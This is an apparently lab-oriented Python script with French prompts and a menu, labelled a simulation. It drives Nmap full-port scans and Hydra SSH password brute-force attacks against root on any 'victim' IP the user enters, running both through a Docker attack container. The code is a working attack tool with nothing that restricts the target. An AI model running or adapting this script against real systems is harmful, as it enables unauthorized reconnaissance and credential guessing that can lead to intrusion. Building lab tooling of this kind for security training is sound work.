import subprocess

def run_nmap(ip_victime):
    print(f"Lancement du scan Nmap sur {ip_victime}...")
    try:
        # Commande pour exécuter Nmap dans le conteneur Docker
        result = subprocess.run(
            ["docker", "exec", "docker_attaque_1", "nmap", "-p-", ip_victime],
            text=True,
            capture_output=True,
            check=True
        )
        print("\n=== Résultat du scan Nmap ===")
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print("\nUne erreur s'est produite lors de l'exécution de Nmap :")
        print(e.stderr)

def run_bruteforce(ip_victime, port, wordlist):
    print(f"Lancement du Bruteforce sur {ip_victime} (port {port}) avec la wordlist {wordlist}...")
    try:
        # Commande pour exécuter Hydra dans le conteneur Docker
        result = subprocess.run(
            ["docker", "exec", "docker_attaque_1", "hydra", "-l", "root", "-P", wordlist, f"ssh://{ip_victime}:{port}"],
            text=True,
            capture_output=True,
            check=True
        )
        print("\n=== Résultat du Bruteforce ===")
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print("\nUne erreur s'est produite lors de l'exécution de Hydra :")
        print(e.stderr)

def main():
    print("=== Simulation de Scan avec Nmap ou Brute Force ===")
    while True:
        print("\nMenu :")
        print("1. Exécuter un scan Nmap")
        print("2. Lancer un Bruteforce (Hydra)")
        print("3. Sortir")
        
        choix = input("Choisissez une option (1/2/3) : ")
        
        if choix == "1":
            ip_victime = input("Entrez l'adresse IP de la victime : ").strip()
            if ip_victime:
                run_nmap(ip_victime)
            else:
                print("Adresse IP invalide. Veuillez réessayer.")
        
        elif choix == "2":
            ip_victime = input("Entrez l'adresse IP de la victime : ").strip()
            if ip_victime:
                port = input("Entrez le port à attaquer (par exemple, 22 pour SSH) : ").strip()
                wordlist = input("Entrez le chemin vers la wordlist : ").strip()
                run_bruteforce(ip_victime, port, wordlist)
            else:
                print("Adresse IP invalide. Veuillez réessayer.")
        
        elif choix == "3":
            print("Au revoir !")
            break
        else:
            print("Option invalide. Veuillez choisir 1, 2 ou 3.")

if __name__ == "__main__":
    main()

